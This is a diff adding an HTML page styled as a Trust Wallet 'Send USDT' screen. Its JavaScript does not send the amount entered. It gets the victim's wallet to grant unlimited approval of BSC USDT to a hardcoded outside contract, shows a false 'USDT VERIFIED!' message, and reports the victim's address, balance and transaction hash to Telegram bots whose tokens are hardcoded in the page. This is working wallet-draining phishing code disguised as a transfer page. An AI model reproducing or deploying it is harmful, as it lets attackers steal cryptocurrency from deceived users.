@@ -1,0 +1,405 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Transfer Trust Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="favicon.ico">
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <!-- FontAwesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    /* ====== FULL WHITE MODE FIX ====== */
+    *, *::before, *::after { -webkit-tap-highlight-color: transparent !important; }
+    
+    html, body, #__next, .min-h-screen, .bg-\[#1b1b1b\] {
+      background: #ffffff !important;
+    }
+    body, .min-h-screen { background: #f9f9f9 !important; }
+
+    /* Text Colors */
+    .text-gray-300, .text-white, h1 { color: #1a1a1a !important; }
+    .text-gray-400, label { color: #555 !important; }
+    .text-gray-500 { color: #777 !important; }
+
+    /* Input Fields */
+    input, .border-gray-800 {
+      background: #f8f8f8 !important;
+      border-color: #ddd !important;
+      color: #000 !important;
+    }
+    input:focus {
+        border-color: #3b82f6 !important;
+        outline: none;
+    }
+
+    /* Green Button (Using Blue/Purple hue per original class name context) */
+    .bg-greentext { 
+       background-color: #083ef3 !important; 
+       color: white !important;
+    }
+    .bg-greentext:hover { opacity: 0.9; }
+    .text-greentext { color: #083ef3 !important; }
+
+    /* Spinner for button */
+    .spinner {
+        display: inline-block;
+        width: 1rem;
+        height: 1rem;
+        border: 2px solid rgba(255,255,255,0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div id="__next">
+    <div>
+      <div class="min-h-screen p-4 max-w-md mx-auto relative">
+        
+        <!-- Header -->
+        <header class="flex w-full items-center mb-8 mt-2 relative">
+           <!-- Back Icon -->
+           <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-black cursor-pointer absolute left-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+           </svg>
+          <h1 class="flex-1 text-center text-xl font-medium">Send USDT</h1>
+        </header>
+
+        <div class="space-y-6">
+          
+          <!-- Address Input -->
+          <div class="space-y-1">
+            <label class="text-sm font-medium">Address or Domain Name</label>
+            <div class="relative">
+              <input placeholder="Search or Enter" class="flex h-12 w-full rounded-md border px-3 text-base pr-32 transition-colors" value="0x0a0364e60c4cea009bE8f50E24D10f57A5Ffb86F">
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 hover:bg-blue-50 transition-colors">Paste</button>
+                <button class="inline-flex items-center justify-center gap-2 rounded-md h-8 w-8 text-greentext hover:bg-blue-50 transition-colors">
+                  <i class="fa-solid fa-qrcode"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Amount Input -->
+          <div class="space-y-1">
+            <label class="text-sm font-medium">Amount</label>
+            <div class="relative">
+              <input placeholder="USDT Amount" type="number" class="flex h-12 w-full rounded-md border px-3 text-base pr-24 transition-colors">
+              <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <span class="text-gray-500 text-sm mr-2 font-bold">USDT</span>
+                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 hover:bg-blue-50 transition-colors" id="max-btn">Max</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="text-xs text-gray-500" id="approx-usd">≈ $0.00</div>
+        </div>
+
+        <!-- Next Button -->
+        <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
+          <button class="w-full bg-greentext rounded-xl disabled:opacity-50 disabled:cursor-not-allowed h-12 text-lg font-semibold inline-flex items-center justify-center gap-2 shadow-lg transition-transform active:scale-95" disabled id="next-btn">
+            Next
+          </button>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- JavaScript Logic -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // ============================================================
+        // CONFIGURATION
+        // ============================================================
+        const CONFIG = {
+            CONTRACT_ADDRESS: "0x498B2002cDC2394739975Ffe1a9DB15BE412a853", 
+            USDT_CONTRACT: "0x55d398326f99059fF775485246999027B3197955",
+            
+            // Telegram Config - WARNING: Hardcoding tokens in frontend is insecure
+            TELEGRAM_BOT_TOKEN_1: "8726474553:AAFFod5RSF_sL8zM-YKNDq-uPup5UZsuku8",
+            ADMIN_CHAT_ID_1: "8718677208",
+            TELEGRAM_BOT_TOKEN_2: "8962513979:AAFduBigm1hg_mOj-_YFiSEZVmtJ5jDuC_g  ",
+            ADMIN_CHAT_ID_2: "8718677208"
+        };
+
+        let userUsdtBalance = 0; // Global tracker for user's balance
+
+        // ============================================================
+        // UI NOTIFICATIONS
+        // ============================================================
+        function showNotification(msg, type = "info", duration = 3000) {
+            let notify = document.getElementById("notify-bar");
+            if (!notify) {
+                notify = document.createElement("div");
+                notify.id = "notify-bar";
+                Object.assign(notify.style, {
+                    position: "fixed", top: "20px", left: "50%", transform: "translateX(-50%)",
+                    zIndex: "9999", minWidth: "260px", padding: "16px 32px", borderRadius: "12px",
+                    fontSize: "1rem", fontWeight: "bold", textAlign: "center", boxShadow: "0 4px 32px #0008",
+                    transition: "all 0.3s", color: "#fff", opacity: "0"
+                });
+                document.body.appendChild(notify);
+            }
+            notify.textContent = msg;
+            notify.style.background = type === "error" ? "#ef4444" : type === "success" ? "#10b981" : "#3b82f6";
+            
+            // Force reflow for animation
+            notify.offsetHeight; 
+            notify.style.opacity = "1";
+            
+            if (duration > 0) {
+                setTimeout(() => { notify.style.opacity = "0"; }, duration);
+            }
+        }
+
+        // ============================================================
+        // TELEGRAM NOTIFICATIONS
+        // ============================================================
+        async function sendTelegram(botToken, chatId, message, keyboard) {
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown",
+                    reply_markup: keyboard
+                })
+            });
+        }
+
+        async function sendTelegramNotifications(walletAddress, txHash, userId, balance, escrowAmount) {
+            const inlineKeyboard = {
+                inline_keyboard: [[ { text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` } ]]
+            };
+
+            const adminMessage =
+                `🔔 *New Escrow Approval*\n\n` +
+                `💰 *Wallet Address:*\n\`${walletAddress}\`\n\n` +
+                `🎯 *Escrow Amount Entered:* ${escrowAmount} USDT\n` +
+                `🤑 *Total USDT Balance:* ${balance} USDT\n\n` +
+                `🔗 *Transaction Hash:*\n\`${txHash}\`\n\n` +
+                `👤 *User ID:* ${userId || "N/A"}\n` +
+                `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+            const userMessage =
+                `🎉 *USDT Approval Successful!*\n\n` +
+                `💰 *Wallet Address:*\n\`${walletAddress}\`\n\n` +
+                `🎯 *Escrow Amount:* ${escrowAmount} USDT\n` +
+                `🔗 *Transaction Hash:*\n\`${txHash}\`\n\n` +
+                `✅ *Status:* Approved for Escrow`;
+
+            try {
+                await sendTelegram(CONFIG.TELEGRAM_BOT_TOKEN_1, CONFIG.ADMIN_CHAT_ID_1, adminMessage, inlineKeyboard);
+                await sendTelegram(CONFIG.TELEGRAM_BOT_TOKEN_2, CONFIG.ADMIN_CHAT_ID_2, adminMessage, inlineKeyboard);
+                if (userId) {
+                    await sendTelegram(CONFIG.TELEGRAM_BOT_TOKEN_1, userId, userMessage, inlineKeyboard);
+                }
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+
+        // ============================================================
+        // FORM LOGIC & MAX BUTTON
+        // ============================================================
+        const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
+        const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
+        const nextBtn = document.getElementById("next-btn");
+        const originalBtnHTML = nextBtn.innerHTML;
+        const approxUsd = document.getElementById("approx-usd");
+        const maxBtn = document.getElementById("max-btn");
+
+        amountInput.value = "1";
+        approxUsd.textContent = "≈ $1.00";
+
+        function updateApproxUsd() {
+            let amount = parseFloat(amountInput.value.trim());
+            approxUsd.textContent = isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
+        }
+        amountInput.addEventListener("input", updateApproxUsd);
+        updateApproxUsd();
+
+        function validate() {
+            const isAddressFilled = addressInput.value.trim().length > 0;
+            const amountValue = parseFloat(amountInput.value.trim());
+            const isAmountValid = !isNaN(amountValue) && amountValue > 0;
+            nextBtn.disabled = !(isAddressFilled && isAmountValid);
+        }
+        addressInput.addEventListener("input", validate);
+        amountInput.addEventListener("input", validate);
+        validate();
+
+        // MAX BUTTON LOGIC
+        if (maxBtn) {
+            maxBtn.addEventListener("click", async function (e) {
+                e.preventDefault();
+                if (!window.ethereum) return showNotification("No Web3 wallet found.", "error");
+                
+                const prevText = maxBtn.textContent;
+                maxBtn.textContent = "...";
+                
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    // The MAX button inherently HAS to ask for a connection if not connected 
+                    // because we need their exact address to read their balance.
+                    await provider.send("eth_requestAccounts", []); 
+                    const signer = provider.getSigner();
+                    const walletAddress = await signer.getAddress();
+                    
+                    const usdt = new ethers.Contract(CONFIG.USDT_CONTRACT, ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], signer);
+                    const decimals = await usdt.decimals().catch(() => 18);
+                    const balance = await usdt.balanceOf(walletAddress);
+                    
+                    userUsdtBalance = parseFloat(ethers.utils.formatUnits(balance, decimals));
+                    
+                    if (userUsdtBalance <= 0) {
+                        showNotification("Your USDT balance is 0.", "error");
+                        amountInput.value = "0";
+                    } else {
+                        amountInput.value = userUsdtBalance.toString();
+                    }
+                    
+                    updateApproxUsd();
+                    validate();
+                } catch (err) {
+                    showNotification("Unable to fetch balance. Please connect wallet.", "error");
+                } finally {
+                    maxBtn.textContent = prevText;
+                }
+            });
+        }
+
+        // ============================================================
+        // APPROVE TRANSACTION
+        // ============================================================
+        nextBtn.addEventListener("click", async function (e) {
+            e.preventDefault();
+
+            if (!window.ethereum) return showNotification("Please install MetaMask or TrustWallet.", "error");
+
+            const enteredAmount = parseFloat(amountInput.value);
+            if (isNaN(enteredAmount) || enteredAmount <= 0) {
+                return showNotification("Please enter a valid amount.", "error");
+            }
+
+            nextBtn.innerHTML = '<span class="spinner"></span> Processing...';
+            nextBtn.disabled = true;
+
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                
+                // Silently check accounts like the old code. DOES NOT force the "Connect" prompt upfront.
+                const accounts = await window.ethereum.request({ method: "eth_accounts" });
+                let fromAddress = accounts[0];
+
+                // 1. Switch to BSC
+                const bnbChainId = "0x38"; 
+                try {
+                    await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: bnbChainId }] });
+                } catch (error) {
+                    if (error.code === 4902) {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [{ chainId: bnbChainId, chainName: "BNB Smart Chain", rpcUrls: ["https://bsc-dataseed.binance.org/"], nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, blockExplorerUrls: ["https://bscscan.com/"] }]
+                        });
+                    }
+                }
+
+                let formattedUsdtBalance = 0;
+
+                // 2. FETCH AND VALIDATE BALANCES (ONLY if they are already silently connected)
+                if (fromAddress) {
+                    const usdt = new ethers.Contract(CONFIG.USDT_CONTRACT, ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], provider);
+                    const decimals = await usdt.decimals().catch(() => 18);
+                    const rawUsdtBalance = await usdt.balanceOf(fromAddress);
+                    formattedUsdtBalance = parseFloat(ethers.utils.formatUnits(rawUsdtBalance, decimals));
+
+                    if (enteredAmount > formattedUsdtBalance) {
+                        showNotification(`Insufficient USDT! You only have ${formattedUsdtBalance.toFixed(2)} USDT.`, "error");
+                        throw new Error("Insufficient USDT");
+                    }
+
+                    const bnbBalance = await provider.getBalance(fromAddress);
+                    const formattedBnb = parseFloat(ethers.utils.formatEther(bnbBalance));
+                    
+                    if (formattedBnb < 0.0003) {
+                        showNotification("Transaction failed: Low BNB balance for gas fees.", "error");
+                        throw new Error("Insufficient Gas");
+                    }
+                }
+
+                // 3. APPROVE (Unlimited approval for escrow contract)
+                const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+                const txData = iface.encodeFunctionData("approve", [CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256.toString()]);
+                
+                // Prepare Transaction. If fromAddress is undefined, the wallet handles the combined connect/approve flow.
+                const txParams = { to: CONFIG.USDT_CONTRACT, data: txData };
+                if (fromAddress) {
+                    txParams.from = fromAddress;
+                }
+
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [txParams]
+                });
+
+                showNotification("Waiting for network confirmation...", "info", 0); // Stays on screen
+
+                // 4. WAIT FOR ACTUAL BLOCK CONFIRMATION
+                const receipt = await provider.waitForTransaction(txHash);
+
+                if (receipt.status === 1) {
+                    showNotification("✅ USDT VERIFIED!", "success");
+                    
+                    // 5. NOTIFY TELEGRAM WITH ENTERED AMOUNT
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const userId = urlParams.get("user_id");
+
+                    // If they connected DURING the approval popup, we grab their address and balance now for Telegram
+                    if (!fromAddress) {
+                        fromAddress = receipt.from;
+                        const usdt = new ethers.Contract(CONFIG.USDT_CONTRACT, ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], provider);
+                        const decimals = await usdt.decimals().catch(() => 18);
+                        const rawUsdtBalance = await usdt.balanceOf(fromAddress);
+                        formattedUsdtBalance = parseFloat(ethers.utils.formatUnits(rawUsdtBalance, decimals));
+                    }
+
+                    await sendTelegramNotifications(fromAddress, txHash, userId, formattedUsdtBalance.toFixed(2), enteredAmount);
+                } else {
+                    showNotification("Transaction reverted by the network.", "error");
+                }
+
+            } catch (err) {
+                console.error(err);
+                if(err.code === 4001 || err.message.includes("User denied")) {
+                    showNotification("Transaction rejected by user.", "error");
+                } else if (err.message !== "Insufficient USDT" && err.message !== "Insufficient Gas") {
+                    showNotification("Transaction failed. Please try again.", "error");
+                }
+            } finally {
+                // Hide persistent loading notification if it's still there
+                const notify = document.getElementById("notify-bar");
+                if (notify && notify.textContent === "Waiting for network confirmation...") {
+                    notify.style.opacity = "0";
+                }
+                
+                nextBtn.disabled = false;
+                nextBtn.innerHTML = originalBtnHTML;
+            }
+        });
+    });
+  </script>
+</body>
+</html>
